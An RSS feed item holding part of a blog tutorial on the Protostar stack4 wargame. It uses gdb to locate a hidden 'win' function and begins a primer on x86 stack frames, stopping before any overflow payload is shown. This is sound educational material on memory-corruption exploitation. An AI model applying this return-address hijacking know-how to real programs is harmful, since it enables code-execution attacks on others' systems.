<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Reverse-Engineering on Shantanu Vs The World</title><link>https://shantanugoel.com/tags/reverse-engineering/</link><description>Recent content in Reverse-Engineering on Shantanu Vs The World</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 04 Dec 2017 21:04:24 +0530</lastBuildDate><atom:link href="https://shantanugoel.com/tags/reverse-engineering/index.xml" rel="self" type="application/rss+xml"/><item><title>Practical Reverse Engineering Tutorials Part 2: Protostar Stack4</title><link>https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/</link><pubDate>Mon, 04 Dec 2017 21:04:24 +0530</pubDate><guid>https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/</guid><description>&lt;h2 id="about-the-challenge">About the challenge&lt;/h2>
&lt;p>In this article, we&amp;rsquo;ll go through the &lt;a href="https://exploit-exercises.com/protostar/stack4/">Protostar stack4&lt;/a> challenge. This would be a bit similar to the stack0 challenge that we already tackled earlier, but it will think about an interesting way to get alternate code to execute instead of just modifying data.&lt;/p>
&lt;p>&lt;strong>Pre-requisite:&lt;/strong> Make sure you&amp;rsquo;ve completed the &lt;a href="https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/">Part 1&lt;/a> of the Practical Reverse Engineering Tutorials series. It&amp;rsquo;d also be great if you can try stack1-stack3 challenges on your own as they are similar to stack0.&lt;/p></description><content>&lt;h2 id="about-the-challenge">About the challenge&lt;/h2>
&lt;p>In this article, we&amp;rsquo;ll go through the &lt;a href="https://exploit-exercises.com/protostar/stack4/">Protostar stack4&lt;/a> challenge. This would be a bit similar to the stack0 challenge that we already tackled earlier, but it will think about an interesting way to get alternate code to execute instead of just modifying data.&lt;/p>
&lt;p>&lt;strong>Pre-requisite:&lt;/strong> Make sure you&amp;rsquo;ve completed the &lt;a href="https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/">Part 1&lt;/a> of the Practical Reverse Engineering Tutorials series. It&amp;rsquo;d also be great if you can try stack1-stack3 challenges on your own as they are similar to stack0.&lt;/p>
&lt;h2 id="recon">Recon&lt;/h2>
&lt;p>Assuming you&amp;rsquo;ve done the setup as needed for Part 1 of this series, we straight away jump to run the challenge to see what we are after.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ ./stack4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ABCD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, we see that the program asks for some user input. When we input &amp;lsquo;ABCD&amp;rsquo;, nothing happens. That&amp;rsquo;s a bummer. We need to move to the static analysis to map out our next actions. Remember, it might be easier to look at the source code of the challenge (and it will also not give much away) but we&amp;rsquo;ll still try to avoid source code as much as possible to give more exercise to our brains.&lt;/p>
&lt;h2 id="static-analysis">Static Analysis&lt;/h2>
&lt;p>We first run our staple &lt;code>strings&lt;/code> on the program to list interesting text data.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ strings stack4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/lib/ld-linux.so.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__gmon_start__
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.so.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_IO_stdin_used
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__libc_start_main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GLIBC_2.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PTRh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>^_&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>code flow successfully changed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We see a potentially useful string &lt;code>code flow successfully changed&lt;/code> straight away. I&amp;rsquo;d wager a guess that we&amp;rsquo;ve to get our currently dumb program to emit this string somehow. Let&amp;rsquo;s see what is the condition under which this string is being printed. So we bring out gdb like last time and check the disassembled code of main function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ gdb stack4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GNU gdb &lt;span style="color:#f92672">(&lt;/span>GDB&lt;span style="color:#f92672">)&lt;/span> 7.0.1-debian
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2009&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>License GPLv3+: GNU GPL version &lt;span style="color:#ae81ff">3&lt;/span> or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software: you are free to change and redistribute it.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>There is NO WARRANTY, to the extent permitted by law. Type &lt;span style="color:#e6db74">&amp;#34;show copying&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>and &lt;span style="color:#e6db74">&amp;#34;show warranty&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> details.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This GDB was configured as &lt;span style="color:#e6db74">&amp;#34;i486-linux-gnu&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For bug reporting instructions, please see:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reading symbols from /opt/protostar/bin/stack4...done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> set disassembly-flavor intel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> disassemble main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048408 &amp;lt;main+0&amp;gt;: push ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048409 &amp;lt;main+1&amp;gt;: mov ebp,esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804840b &amp;lt;main+3&amp;gt;: and esp,0xfffffff0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804840e &amp;lt;main+6&amp;gt;: sub esp,0x50
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048411 &amp;lt;main+9&amp;gt;: lea eax,&lt;span style="color:#f92672">[&lt;/span>esp+0x10&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048415 &amp;lt;main+13&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,eax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048418 &amp;lt;main+16&amp;gt;: call 0x804830c &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804841d &amp;lt;main+21&amp;gt;: leave
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804841e &amp;lt;main+22&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>End of assembler dump.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That&amp;rsquo;s interesting. So there&amp;rsquo;s no way main can print the string we&amp;rsquo;re after because there&amp;rsquo;s no print/puts call in here. Interestingly, main makes only one function call to &lt;code>gets&lt;/code> to get user input and there&amp;rsquo;s no other function being called at all. This would mean that the string is being printed from somewhere else and our challenge is to get that code executed. We know from the previous challenge we solved that to print this string, the program would need to pass a pointer to it as a parameter to a output function (like &lt;code>puts&lt;/code>). So to find that where this string is getting printed from, we&amp;rsquo;ve to first the address where this string is located and then search for reference to it.&lt;/p>
&lt;p>You may know that there are various sections in an executable file. Generally, the executable portion is part of a section called &lt;code>.text&lt;/code> and literal strings are part of a section called &lt;code>.rodata&lt;/code>. So, our technique here would be to:&lt;/p>
&lt;ul>
&lt;li>Get the section addresses (Using &lt;code>maintenance info sections&lt;/code> gdb command)&lt;/li>
&lt;li>Search for the string&amp;rsquo;s address in .rodata section (using &lt;code>find &amp;lt;section_start_address&amp;gt; &amp;lt;section_end_address&amp;gt; &amp;lt;string&amp;gt;&lt;/code> gdb command)&lt;/li>
&lt;li>Search for a reference to the string&amp;rsquo;s address in .text section (using &lt;code>find &amp;lt;section_start_address&amp;gt; &amp;lt;section_end_address&amp;gt; &amp;lt;string_address&amp;gt;&lt;/code> gdb command)&lt;/li>
&lt;/ul>
&lt;p>This is shown below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> maintenance info sections
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exec file:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">`&lt;/span>/opt/protostar/bin/stack4&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>, file type elf32-i386.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048114-&amp;gt;0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048128-&amp;gt;0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048148-&amp;gt;0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x804816c-&amp;gt;0x8048198 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048198-&amp;gt;0x80481b8 at 0x00000198: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80481b8-&amp;gt;0x8048218 at 0x000001b8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048218-&amp;gt;0x8048267 at 0x00000218: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048268-&amp;gt;0x8048274 at 0x00000268: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048274-&amp;gt;0x8048294 at 0x00000274: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048294-&amp;gt;0x804829c at 0x00000294: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x804829c-&amp;gt;0x80482bc at 0x0000029c: .rel.plt ALLOC LOAD READONLY DATA HAS_CO---Type &amp;lt;&lt;span style="color:#66d9ef">return&lt;/span>&amp;gt; to &lt;span style="color:#66d9ef">continue&lt;/span>, or q &amp;lt;&lt;span style="color:#66d9ef">return&lt;/span>&amp;gt; to quit---
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80482bc-&amp;gt;0x80482ec at 0x000002bc: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80482ec-&amp;gt;0x804833c at 0x000002ec: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048340-&amp;gt;0x80484bc at 0x00000340: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80484bc-&amp;gt;0x80484d8 at 0x000004bc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80484d8-&amp;gt;0x80484ff at 0x000004d8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8048500-&amp;gt;0x8048504 at 0x00000500: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8049504-&amp;gt;0x804950c at 0x00000504: .ctors ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x804950c-&amp;gt;0x8049514 at 0x0000050c: .dtors ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8049514-&amp;gt;0x8049518 at 0x00000514: .jcr ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8049518-&amp;gt;0x80495e8 at 0x00000518: .dynamic ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80495e8-&amp;gt;0x80495ec at 0x000005e8: .got ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x80495ec-&amp;gt;0x8049608 at 0x000005ec: .got.plt ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8049608-&amp;gt;0x8049610 at 0x00000608: .data ALLOC LOAD DATA HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x8049610-&amp;gt;0x8049618 at 0x00000610: .bss ALLOC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000-&amp;gt;0x0ad4 at 0x00000610: .stab READONLY HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000-&amp;gt;0x3bd2 at 0x000010e4: .stabstr READONLY HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---Type &amp;lt;&lt;span style="color:#66d9ef">return&lt;/span>&amp;gt; to &lt;span style="color:#66d9ef">continue&lt;/span>, or q &amp;lt;&lt;span style="color:#66d9ef">return&lt;/span>&amp;gt; to quit---
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000-&amp;gt;0x0039 at 0x00004cb6: .comment READONLY HAS_CONTENTS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> find 0x80484d8,0x80484ff,&lt;span style="color:#e6db74">&amp;#34;code flow successfully changed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80484e0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span> pattern found.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/s 0x80484e0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80484e0: &lt;span style="color:#e6db74">&amp;#34;code flow successfully changed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> find 0x8048340, 0x80484bc, 0x80484e0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80483fd &amp;lt;win+9&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span> pattern found.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/3i 0x80483fd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80483fd &amp;lt;win+9&amp;gt;: loopne 0x8048383 &amp;lt;__do_global_dtors_aux+19&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80483ff &amp;lt;win+11&amp;gt;: add al,0x8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8048401 &amp;lt;win+13&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus we figure that the string is being called as part of a function called &lt;code>win&lt;/code> as gdb shows. We can confirm this by disassembling &lt;code>win&lt;/code> and this will also give us its address that we need to direct our code execution to.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> disassemble win
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> win:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f4 &amp;lt;win+0&amp;gt;: push ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f5 &amp;lt;win+1&amp;gt;: mov ebp,esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f7 &amp;lt;win+3&amp;gt;: sub esp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483fa &amp;lt;win+6&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,0x80484e0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048401 &amp;lt;win+13&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048406 &amp;lt;win+18&amp;gt;: leave
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048407 &amp;lt;win+19&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>End of assembler dump.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, we need to make our program start executing at 0x80483f4 (Entry point of function &lt;code>win&lt;/code>) somehow.&lt;/p>
&lt;h3 id="a-primer-about-x86-stack-frames">A primer about X86 stack frames&lt;/h3>
&lt;p>Before continuing further, we will have to learn a bit about how program control works through stack frames. A stack frame is a region on the stack particular to a single function being executed in the call flow and represents its execution environment. If the same function is called many times, each instance of calling that function will have its own stack frame on the stack. A stack frame typically consists of:&lt;/p>
&lt;ul>
&lt;li>Parameters passed to the function&lt;/li>
&lt;li>Return address (Code location to jump to after the function is complete)&lt;/li>
&lt;li>Pointer to the previous (Calling function&amp;rsquo;s) stack frame&amp;rsquo;s base&lt;/li>
&lt;li>Local variables&lt;/li>
&lt;/ul>
&lt;p>Let&amp;rsquo;s see with the help of a small example how this works.&lt;/p>
&lt;h4 id="sample-code">Sample Code&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> x &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> y &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> a &lt;span style="color:#f92672">+&lt;/span> x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> b &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">foo&lt;/span>(a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will compile to the following assembly code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>foo:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>,&lt;span style="color:#66d9ef">esp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">sub&lt;/span> &lt;span style="color:#66d9ef">esp&lt;/span>,&lt;span style="color:#ae81ff">0x10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x8&lt;/span>],&lt;span style="color:#ae81ff">0x2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x4&lt;/span>],&lt;span style="color:#ae81ff">0x3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>,&lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">add&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x8&lt;/span>],&lt;span style="color:#66d9ef">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>,&lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x8&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">leave&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>,&lt;span style="color:#66d9ef">esp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">sub&lt;/span> &lt;span style="color:#66d9ef">esp&lt;/span>,&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x8&lt;/span>],&lt;span style="color:#ae81ff">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x4&lt;/span>],&lt;span style="color:#ae81ff">0x1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>,&lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">ebp-0x8&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">esp&lt;/span>],&lt;span style="color:#66d9ef">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#ae81ff">0x80483ed&lt;/span> &amp;lt;&lt;span style="color:#66d9ef">foo&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">leave&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="stack-frame">Stack frame&lt;/h4>
